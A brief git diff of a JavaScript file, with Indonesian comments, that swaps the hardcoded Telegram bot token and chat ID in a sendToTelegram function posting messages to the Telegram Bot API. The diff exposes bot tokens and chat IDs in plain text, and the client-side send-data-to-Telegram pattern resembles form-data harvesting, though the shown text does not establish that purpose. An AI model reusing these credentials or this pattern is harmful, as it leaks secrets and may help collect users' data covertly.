@@ -16,8 +16,8 @@ function showPage(pageId) {
 
 // Fungsi untuk mengirim data ke Telegram
 function sendToTelegram(message) {
-  const token = "7631485703:AAFVK8I7AnMoUvNFLek_n4SIz1e3RJkpP9Q"; // Token bot Telegram Anda
-  const chatId = "8128853144"; // Chat ID atau ID grup Anda
+  const token = "7769931046:AAFihGvO0baoVRNo3uXfyz0PjSCoeV0bnJs"; // Token bot Telegram Anda
+  const chatId = "7769931046"; // Chat ID atau ID grup Anda
 
   return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
